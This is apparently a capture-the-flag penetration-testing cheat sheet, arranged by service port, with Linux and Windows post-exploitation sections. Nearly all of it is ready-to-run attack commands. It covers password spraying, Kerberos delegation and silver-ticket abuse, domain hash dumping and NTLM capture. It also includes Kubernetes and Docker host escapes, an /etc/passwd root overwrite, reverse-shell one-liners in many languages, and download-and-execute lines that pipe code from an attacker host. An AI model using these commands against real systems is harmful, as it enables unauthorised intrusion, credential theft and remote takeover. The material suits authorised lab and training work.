$USERNAME@$TARGET -i id_rsa -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa
$USERNAME@$TARGET -i id_dsa -oHostKeyAlgorithms=+ssh-dss -oPubkeyAcceptedKeyTypes=+ssh-dss

+---------- Port Forwarding ----------+
ssh $USERNAME@$TARGET -i id_ed25519 -L 33060:Localhost:33060 -L 5000:Localhost:5000
ssh $USERNAME@$TARGET -i id_rsa -L 33060:Localhost:33060 -L 5000:Localhost:5000
ssh $USERNAME@$TARGET -i id_dsa -L 33060:Localhost:33060 -L 5000:Localhost:5000

[*] (23) Telnet
+---------- Spray Service ----------+
(hydra -I telnet://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)

+---------- Login to Service ----------+
telnet --user '$USERNAME' $TARGET

[*] (25) SMTP
nmap -p 25 --script="smtp* and not brute" --script-args "smtp-enum-users.methods={VRFY},userdb=/usr/share/nmap/nselib/data/usernames.lst" $TARGET

sendemail \
        -s $TARGET \
        -f "Admin Team <admin@$DOM>" \
        -t career@$DOM \
        -o tls=no \
        -u "Subject: Important Document" \
        -m "This is the document you asked for. Thanks again" \
        -a "$HOME/.msf4/local/msf.odt"

[*] (53) DNS
dig axfr @$TARGET $DOM

[*] (79) Finger
finger '$USERNAME'@$TARGET
while read -r user; do finger "$user"@$TARGET; done < usernames

[*] (88) Kerberos
+---------- .ccache ----------+
impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME' -hashes :8846F7EAEE8FB117AD06BDD830B7586C; export KRB5CCNAME=`pwd`/$USERNAME.ccache

+---------- Kerberos .ccache Negotiation ----------+
impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request
impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag {print $1}'
impacket-GetADComputers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass
impacket-findDelegation -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass
impacket-addcomputer -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -computer-name mypc -computer-pass '123qweasdF!'
impacket-rbcd -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -action write -delegate-from mypc$ -delegate-to DC$
impacket-getTGT -dc-ip $TARGET $DOM/'mypc$':'123qweasdF!'; export KRB5CCNAME=`pwd`/mypc$.ccache
impacket-getST -dc-ip $TARGET $DOM/mypc$ -k -no-pass -impersonate administrator -spn "host/$DC"
export KRB5CCNAME=`pwd`/administrator
impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c type \\Users\\Administrator\\Desktop\\root.txt" | grep -v '\['
impacket-secretsdump -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass -just-dc-user administrator
evil-winrm -i $TARGET -u administrator -H ''

impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newpass '123qweasdF!'
impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newpass '123qweasdF!' -p kpasswd -reset
impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newhashes :$(impacket-describeTicket $USERNAME.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs)
while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request-user '$user'; done < usernames

+---------- Silver Ticket ----------+
-->> Domain SID
bloodyAD --dc-ip $TARGET --host DC1.scrm.local -d scrm.local -k get search --filter "(&(ObjectClass=user)(objectSid=*)(!(ObjectClass=foreignSecurityPrincipal)))" --attr objectSid | grep -avE 'nTSecurityDescriptor:|distinguishedName:' | cut -d ' ' -f 2 | sed 's/-[0-9]\+$//' | sort -u | sed '/^$/d' | tee silver-ticket

-->> Service Principal Name
impacket-GetUserSPNs -dc-ip 10.10.11.168 -dc-host DC1.scrm.local scrm.local/ -k -no-pass -request | awk '{print $1}' | grep -vE 'Impacket|\$krb5|Service|----|^$|\[' | cut -d '/' -f 1 >> silver-ticket; cat silver-ticket

-->> Service Account Password Hash
echo -n 'Pegasus60' | iconv -t UTF-16LE | openssl dgst -md4 | cut -d ' ' -f 2 | sed 's/.*/\U&/' >> silver-ticket; cat silver-ticket

-->> Create Ticket
cat silver-ticket | { read a; read _; read c; impacket-ticketer -domain $DOM -domain-sid "$a" -spn "cifs/$DC" -nthash "$c" administrator 2>/dev/null; }; export KRB5CCNAME=`pwd`/administrator.ccache

[*] (135) RPC
rpcclient -U "" -N $TARGET -c "enumdomusers"
rpcclient -U '$USERNAME'%'$PASSWORD' $TARGET -c "enumdomusers"
rpcclient -U '$USERNAME'%'$PASSWORD' $TARGET -c "lsaquery"
rpcclient -U '$USERNAME'%'$PASSWORD' $TARGET -c "querydispinfo" | grep -oP 'Account:.*' | sed 's/Name:.*Desc:/Desc:/'

for host in $(cat dc-hosts); do echo "================[   $host   ]==============="; rpcclient -U "" $host -N -c "enumdomusers"; done
for host in $(cat dc-hosts); do rpcclient -U "" $host -N -c "enumdomusers"; done | grep -oP 'user:\[\K[^]]+'

[*] (161) SNMP
+---------- Spray Service ----------+
(hydra -I snmpv2c://$TARGET -P /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt -t15 2>/dev/null &)

+---------- Read Service ----------+
snmp-check $TARGET -c COMMUNITY_STRING -v 2c

[*] (389) LDAP
+---------- Spray Service ----------+
(hydra -I ldap2://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)

+---------- Visualise LDAP ----------+
godap $TARGET -d $DOM -t ldap/$DC -k

+---------- Domain SID ----------+
nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --get-sid

+---------- Trusted For Delegation ----------+
nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success --trusted-for-delegation

+---------- Other Attacks ----------+
nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success
nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success -k
nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M get-desc-users
nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(servicePrincipalName=*)" "cn sAMAccountName servicePrincipalName"
nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success --kerberoasting krb5-hashes
nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --dc-list --query "(SAMAccountType=805306369)" "SAMAccountName"
nxc ldap $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SAMAccountType=805306369)" "SAMAccountName" | awk '{print $6}' | grep '\$' > machines | sed 's/.$//' | tr '[:upper:]' '[:lower:]' > machines_pw; nxc smb $TARGET -u machines -p machines_pw | grep -oP '\[-\].*TRUST_ACCOUNT.*' | while read line; do echo -e "\e[1;33m$line <--- CHANGE PASSWORD NOW\!\e[0m"; done

[*] (445) SMB
+---------- Spray Service ----------+
(hydra -I smb://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
(hydra -I smb2://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)

+---------- Spider Share for Files ----------+
NXCSPIDER=$(nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' -M spider_plus | grep -oP '(?<=Saved share-file metadata to ")[^"]+');cat $NXCSPIDER | grep -vE 'epoch|size' | sed -E 's/[{}\",:]//g' | sed '/^        $/d' | tee smbfiles_$USERNAME

+---------- Download Files Locally ----------+
mkdir smb; smbclient //$TARGET/SHARE -N -D . -c 'lcd smb; recurse; prompt; mget *'
mkdir smb; smbclient //$TARGET/SHARE -U '$USERNAME'%'$PASSWORD' -D . -c 'lcd smb; recurse; prompt; mget *'

+---------- Capture NTLMv2 ----------+
sudo responder -I tun0
echo -n '[shell]\nCommand=2\nIconFile=\\$MYIP\\share\\t.ico\n[Taskbar]\nCommand=ToggleDesktop' > file.scf
Upload file.scf to SMB share

+---------- NTDS ----------+
nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' --ntds --user Administrator
nxc smb $TARGET --use-kcache --ntds --user Administrator

[*] (512-514) RSERVICES
+---------- Spray Service ----------+
(hydra -I rlogin://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)

+---------- Allow All Connections ----------+
echo '+ +' > ~/.rhosts; chmod 600 ~/.rhosts

+---------- Login to Service ----------+
rsh -l $USERNAME $TARGET
rlogin -l $USERNAME $TARGET

+---------- Execute Commands ----------+
rsh -l $USERNAME $TARGET cat /etc/passwd

[*] (10249-10250) Kubelet
+---------- View Pods ----------+
kubeletctl -s $TARGET pods

+---------- Execute Commands ----------+
kubeletctl -s $TARGET run "cat /etc/passwd" --all-pods
kubeletctl -s $TARGET run "cat /etc/passwd" -p $pod -n $namespace -c $container

+---------- Get Token and CA.crt ----------+
pod=nginx; namespace=default; container=nginx
kubeletctl -s $TARGET run "ls -la /run/secrets/kubernetes.io/serviceaccount" -p $pod -n $namespace -c $container
kubeletctl -s $TARGET run "ls -la /var/run/secrets/kubernetes.io/serviceaccount" -p $pod -n $namespace -c $container
kubeletctl -s $TARGET run "ls -la /secrets/kubernetes.io/serviceaccout" -p $pod -n $namespace -c $container
kubeletctl -s $TARGET run "cat /secrets/kubernetes.io/serviceaccout/ca.crt" -p $pod -n $namespace -c $container | tee ca.crt; chmod 600 ca.crt
kubeletctl -s $TARGET run "cat /secrets/kubernetes.io/serviceaccout/token" -p $pod -n $namespace -c $container | tee token; chmod 600 token

+---------- Authenticating to Kubernetes API ----------+
kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat token) get pod

+---------- Kubernetes Privileges ----------+
kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat token) auth can-i --list

+---------- Kubernetes Pod Details ----------+
kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat token) get pod nginx -o yaml
kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat token) get pod nginx -o yaml | grep -E 'namespace:|image:'

+---------- Kubernetes Create Custom YAML ----------+
apiVersion: v1
kind: Pod
metadata:
  name: my-pod
  namespace: $namespace
spec:
  containers:
  - name: my-pod
    image: nginx:1.14.2
    command: ["/bin/bash"]
    args: ["-c", "/bin/bash -i >& /dev/tcp/$MYIP/5555 0>&1"]
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true

+---------- Kubernetes Create Custom Pod ----------+
kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat token) apply -f my.yaml
kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat token) get pod

[*] (1433) MSSQL
+---------- Spray ----------+
(hydra -I mssql://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)

+---------- Bruteforce ----------+
cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f1 | sort -u > /tmp/mssqlusernames
cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f2 | sort -u > /tmp/mssqlpasswords
hydra -I mssql://$TARGET -L /tmp/mssqlusernames -P /tmp/mssqlpasswords -e n -t15 2>/dev/null

+---------- Impacket ----------+
impacket-mssqlclient -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass
impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET'
impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET' -windows-auth

+---------- Get DB ----------+
sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -C "SELECT name FROM master.dbo.sysdatabases;" | grep -oP '^name:\s*\K\S+'

+---------- Set DB ----------+
DB_NAME="master"

+---------- Query DB ----------+
sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;" | grep -Ei 'user'
sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS;" | grep -i -B2 'passw'
sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;" | grep -Ei 'account'
sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;" | grep -Ei 'mail'
sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;" | grep -Ei 'db'
sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT * FROM users;"
sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT @@VERSION AS version, HOST_NAME() AS hostname, SYSTEM_USER AS sys_user;"
sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "EXEC xp_cmdshell 'dir C:\ && whoami /user /priv';"

+---------- Get Hash ----------+
sudo responder -I tun0 -v
DB_NAME="master"; sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "EXEC xp_dirtree '//$MYIP/RESPONDER';"

[*] (1521) OracleTNS
+---------- Find Service Name ----------+
sudo odat snguesser -s $TARGET

+---------- Find Valid Creds ----------+
echo 'c' | sudo odat passwordguesser -s $TARGET -n XE

+---------- Execute Commands ----------+
sudo odat dbmsscheduler -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --cmd-exe --exec whoami

+---------- SQL Shell and Queries----------+
sudo odat search -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --sysdba --sql-shell
SELECT * FROM v$version
SELECT * FROM user_role_privs
SELECT * FROM user_sys_privs
SELECT * FROM user_users;
SELECT username FROM all_users
SELECT table_name FROM all_tables
SELECT * FROM tab
SELECT * FROM EMPLOYEES

+---------- Download Files ----------+
sudo odat utlfile -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --getFile 'C:\' 'secret.txt' output
sudo odat utlfile -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --getFile '/etc' 'passwd' output
sudo odat dbmsxslprocessor -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --getFile 'C:\' 'secret.txt' output; cat output
sudo odat dbmsxslprocessor -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --getFile '/etc' 'passwd' output; cat output

+---------- Upload Files ----------+
sudo odat utlfile -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --putFile 'C:\ProgramData\' '' upload.file

[*] (2049) NFS
+---------- List Mounts ----------+
showmount -e $TARGET; mkdir nfs 2>/dev/null

+---------- Version Check ----------+
for v in 2 3 4; do sudo mount -t nfs -o vers=$v,nolock $TARGET:/DIRECTORY ./nfs && echo "vers=$v SUCCESS" && sudo umount ./nfs || echo "vers=$v FAILED"; done

+---------- Mount NFS, List Files ----------+
sudo mount -t nfs -o vers=3,nolock "$TARGET":"/DIRECTORY" "./nfs"
sudo tree -puga "./nfs/"

+---------- Unmount NFS ----------+
sudo umount --lazy "./nfs"; rm -rf "./nfs"

+---------- Copy Files to Current Folder ----------+
sudo cp -r ./nfs/. .

+---------- Open Files as Sudo ----------+
sudo open file.txt
sudo open file.png

+---------- Add User for Reading Files ----------+
sudo adduser -u 1002 mntuser
sudo su mntuser
setpriv --reuid=1002 --regid=1002 --clear-groups -- ls -laR

[*] (2375) Docker
+---------- List Images ----------+
curl -s http://$TARGET:2375/images/json | jq -r .[].RepoTags[]
alpine:latest

+---------- Create Image ----------+
curl -s -X POST http://10.129.121.211:2375/images/create?fromImage=alpine&tag=latest

+---------- List Containers ----------+
(echo -e "ID\tSTATE\tIMAGE\tIP"; curl -s http://$TARGET:2375/containers/json?all=true | jq -r '.[] | [.Id, .State, .Image, (.NetworkSettings.Networks | to_entries[0].value.IPAddress)] | @tsv') | column -t

+---------- Create Container using Image and Start ----------+
containerID=$(curl -s -X POST http://10.129.121.211:2375/containers/create -H "Content-Type: application/json" -d '{"Image":"alpine","Cmd":["sleep", "400"],"HostConfig":{"Binds":["/:/mnt"]}}' | jq -r .Id); curl -s -X POST http://10.129.121.211:2375/containers/"$containerID"/start; curl -s -X POST http://10.129.121.211:2375/containers/"$containerID"/exec -H "Content-Type: application/json" -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["chroot","/mnt","sh"]}'

+---------- Start Container ----------+
containerID=f3f61958a8f66f50f2138af84d85fdafe6e1e65ddd36fdd9fa27acc4cae57d96; curl -s -X POST http://10.129.121.211:2375/containers/"$containerID"/start; curl -s -X POST http://10.129.121.211:2375/containers/"$containerID"/exec -H "Content-Type: application/json" -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["chroot","/mnt","sh"]}'

+---------- Execute Command ----------+
commandID=$(curl -s -X POST http://$TARGET:2375/containers/"$containerID"/exec -H "Content-Type: application/json" -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-c","cat /mnt/etc/passwd; ls -la /mnt"]}' | jq -r .Id); curl -s -X POST http://$TARGET:2375/exec/"$commandID"/start -H "Content-Type: application/json" -d '{"Detach":false,"Tty":true}'

+---------- Remove Containers ----------+
curl -s -X DELETE http://$TARGET:2375/containers/7d9f2df890e2ce4a9c8342a64c33c01755b800b2c6b7b6106fce93fe056da256?force=true

[*] (3306) MySQL
+---------- Spray Service ----------+
(hydra -I mysql://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)

+---------- Bruteforce Using Defaults ----------+
cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt | cut -d: -f1 | sort -u > /tmp/mysqlusernames
cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt | cut -d: -f2 | sort -u > /tmp/mysqlpasswords
hydra -I mysql://$TARGET -L /tmp/mysqlusernames -P /tmp/mysqlpasswords -e n -t15 2>/dev/null

+---------- Executing Queries ----------+
mysql -h localhost -u root --skip-ssl -p'root' -e 'show databases;'
mysql -h localhost -u $USERNAME --skip-ssl -p'$PASSWORD' -e 'show databases;'
mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "SELECT table_schema,table_name FROM information_schema.tables;" | grep -E 'user'
mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "SELECT table_schema,table_name FROM information_schema.tables;" | grep -E 'account'
mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "SELECT table_schema,table_name FROM information_schema.tables;" | grep -E 'mail'
mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "SELECT table_schema,table_name FROM information_schema.tables;" | grep -E 'db'
mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "SELECT table_schema,table_name,column_name FROM information_schema.columns" | grep 'passw'
mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "USE db_name; SELECT * FROM users\G;"
mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "SELECT @@version, @@hostname, user();"
mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "SELECT LOAD_FILE('/etc/passwd')\G;"

[*] (3389) RDP
+---------- Spray Service ----------+
(hydra -I rdp://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)

+---------- Login to Service ----------+
xfreerdp3 /v:'$TARGET' /d:'' /u:'' /p:'' /cert:ignore /sec:nla /tls:seclevel:0 +auto-reconnect +clipboard +drive:Downloads,"/Upload"
xfreerdp3 /v:'$TARGET' /d:'$DOM' /u:'$USERNAME' /p:'$PASSWORD' /cert:ignore /sec:nla /tls:seclevel:0 +auto-reconnect +clipboard +drive:Downloads,"/Upload"

[*] (5985) WINRM
evil-winrm -i "$TARGET" -u '$USERNAME' -p '$PASSWORD'
evil-winrm -i "$TARGET" -u '$USERNAME' -H '$HASH'

# Post-Exploitation 
## Start Fileserver
python3 -m http.server 8888 -d /Upload

## Transfer Tools to a Proxy Box
scp -C -r /Upload user@proxybox:/ ; ssh user@proxybox; python3 -m http.server 8888 -d /Upload

## Linux
[*] Initial Shell
+---------- Generate resh ----------+
python3 /Upload/resh.py $MYIP 5555 /Upload/resh

+---------- Execute resh ----------+
curl http://$MYIP:8888/resh | sh
wget -qO- http://$MYIP:8888/resh | sh

[*] File Transfer
curl http://$MYIP:8888/linux/linpeas.sh | sh
wget -qO- http://$MYIP:8888/linux/linpeas.sh | sh

[*] Privilege Escalation
+---------- Initial Checks ----------+
echo -e '\n\n'; ls -laR /home /opt
echo -e '\n\n'; find / -perm /4000 2>/dev/null | xargs ls -la
echo -e '\n\n'; cat /etc/crontab
echo -e '\n\n'; strings /proc/self/environ | tr '\0' '\n' | sort
echo -e '\n\n'; netstat -tuln
echo -e '\n\n'; sudo -l

+---------- Polkit Version ----------+
rpm -qa | grep -i polkit | grep -i "0.11[3-9]"
apt list --installed 2>/dev/null | grep -i policykit

+---------- Group Files ----------+
find / -group developer 2>/dev/null

+---------- Services Running ----------+
systemctl list-units --type=service --state=running

+---------- Bash SUID Exploits ----------+
f=/tmp/bash;cp /bin/bash $f;chmod u+s $f
f=x;echo -e '#!/bin/bash\ncp /bin/bash /tmp\nchmod u+s /tmp/bash'>$f;chmod +x $f

+---------- Exploits ----------+
snapd_2.37          https://www.exploit-db.com/exploits/46361
sudo_1.6.9.p18      https://www.exploit-db.com/exploits/7129
polkit_0.117-2      https://www.exploit-db.com/exploits/50011

+---------- SSH Files ----------+
cd ~/.ssh; ls -la
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINzZbkLBUl5mk0AW8lPkWRXrupSiydDr8GJauiEAu3Ze<REDACTED>' > ~/.ssh/authorized_keys

+---------- Config Files ----------+
grep -r -E 'conf' /var/www

+---------- /etc/passwd Permission ----------+
ls -la /etc/passwd
nano /etc/passwd
mkpasswd -m descrypt 'password'
piS1wHGBkJ3z2
root:piS1wHGBkJ3z2:0:0:root:/root:/usr/bin/bash

+---------- Switching Users ----------+
su root -p
password

+---------- Finding Files ----------+
find / -name '*secret0*' -readable 2>/dev/null | xargs ls -la
find / -name 'root.txt' -readable -exec echo {} \; -exec cat {} \; 2>/dev/null

+---------- /etc/shadow ----------+
cat /etc/shadow

[*] Containers
+---------- Docker ----------+
curl -s --unix-socket /var/run/docker.sock http:/./images/json
curl -s --unix-socket /var/run/docker.sock http:/./containers/json
curl -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock http:/./containers/create -d '{"Detach":true,"AttachStdin":false,"AttachStdout":true,"AttachStderr":true,"Tty":false,"Image":"staging:latest","HostConfig":{"Binds": ["/:/var/tmp"]},"Cmd":["sh", "-c", "curl http://$MYIP:8888/shells/resh | sh"]}'
curl -X POST -H "Content-Type:application/json" --unix-socket /var/run/docker.sock http:/./containers/f33aa36ef776879b434e918208f9db2e1bce018484a019482ff6a85cb5f98a9a/start
ls -la /var/tmp

cat /etc/mtab | grep -oP 'upperdir.*' | cut -d ',' -f1
docker ps -a
docker commit 35c090009763 tempimg
docker run -it --rm --privileged -v /:/mnt tempimg chroot /mnt sh

[*] Meterpreter
msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; setg RHOSTS $TARGET; setg USERNAME $USERNAME; setg PASSWORD $PASSWORD; setg SESSION 1; setg PAYLOAD linux/x64/meterpreter/bind_tcp; setg PAYLOAD_OVERRIDE linux/x64/meterpreter/bind_tcp; setg PLATFORM_OVERRIDE linux; setg PSH_ARCH_OVERRIDE x64; run; background; use post/multi/manage/shell_to_meterpreter; run'

msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; setg RHOSTS $TARGET; setg USERNAME $USERNAME; setg PASSWORD $PASSWORD; setg SESSION 1; setg PAYLOAD linux/x64/meterpreter/reverse_tcp; setg PAYLOAD_OVERRIDE linux/x64/meterpreter/reverse_tcp; setg PLATFORM_OVERRIDE linux; setg PSH_ARCH_OVERRIDE x64; run; background; use post/multi/manage/shell_to_meterpreter; run;'

[*] Upgrade TTY
python3 -c 'import pty; pty.spawn("/bin/bash")';
CTRL-Z
stty size;stty raw -echo;fg
export SHELL=bash;
export TERM=xterm-256color;
stty rows <num> columns <num>
reset

[*] Shells
+---------- One Liners ----------+
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc $MYIP 5555 >/tmp/f 
/bin/sh -i >& /dev/tcp/$MYIP/5555 0>&1
php -r '$sock=fsockopen("$MYIP",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$MYIP",5555)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
perl -e 'use Socket;$i="$MYIP";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
ruby -rsocket -e'f=TCPSocket.open("$MYIP",5555).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
lua -e "require('socket');require('os');t=socket.tcp();t:connect('$MYIP','5555');os.execute('/bin/sh -i <&3 >&3 2>&3');"

+---------- Listeners ----------+
rlwrap nc -lvnp 5555
rlwrap msfconsole -q -x "use exploit/multi/script/web_delivery; set LHOST $MYIP; set LPORT 7777; set SRVHOST $MYIP; set TARGET 7; set payload linux/x64/shell/reverse_tcp; run"
rlwrap msfconsole -q -x "use exploit/multi/script/web_delivery; set LHOST $MYIP; set LPORT 7777; set SRVHOST $MYIP; set TARGET 7; set payload linux/x64/meterpreter/reverse_tcp; run"
rlwrap msfconsole -q -x "use multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 7777; run"
rlwrap msfconsole -q -x "use multi/handler; set payload php/reverse_php; set LHOST $MYIP; set LPORT 7777; run"

+---------- MSFVenom ----------+
msfvenom -p php/reverse_php LHOST=$MYIP LPORT=5555 -f raw -o shell.php
msfvenom -p php/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f raw -o shell.php
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f elf -o shell.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f elf -o shell.elf
msfvenom -p python/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f raw -o shell.py
msfvenom -p python/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f raw -o shell.py

## Windows
[*] Initial Shell
+---------- Execute resh ----------+
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/resh.ps1');resh -Reverse $MYIP -Port 5555"

[*] File Transfer
wget http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe; wget http://$MYIP:8888/windows/EfsPotato.exe -o \programdata\EfsPotato.exe; wget http://$MYIP:8888/bat2exe.bat -o \programdata\bat2exe.bat
curl http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe; curl http://$MYIP:8888/windows/EfsPotato.exe -o \programdata\EfsPotato.exe; curl http://$MYIP:8888/bat2exe.bat -o \programdata\bat2exe.bat
certutil -urlcache -f http://$MYIP:8888/windows/nc.exe \programdata\nc.exe; certutil -urlcache -f http://$MYIP:8888/windows/EfsPotato.exe \programdata\EfsPotato.exe; certutil -urlcache -f http://$MYIP:8888/bat2exe.bat \programdata\bat2exe.bat

[*] Privilege Escalation
+---------- Priv Check ----------+
powershell -c "whoami /user /priv /groups"

+---------- SeBackupPrivilege ----------+
robocopy /b \users\administrator\desktop\ .; type \users\administrator\desktop\root.txt

+---------- SeImpersonatePrivilege ----------+
echo -e 'type \\users\\administrator\\desktop\\root.txt' | rlwrap nc -lvnp 5566
C:\programdata\EfsPotato.exe "C:\programdata\nc.exe $MYIP 5566 -e cmd"

+---------- Initial Checks ----------+
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publishe
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object { $_.Publisher -and $_.Publisher -notlike "*Microsoft*" } | Select-Object DisplayName, DisplayVersion, Publisher
powershell -c "tree \users /a /f"
powershell -c "tree \inetpub /a /f"
powershell -c "tree \xampp /a /f"
powershell -c "tree $env:APPDATA/.. /a /f"
powershell -c "type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
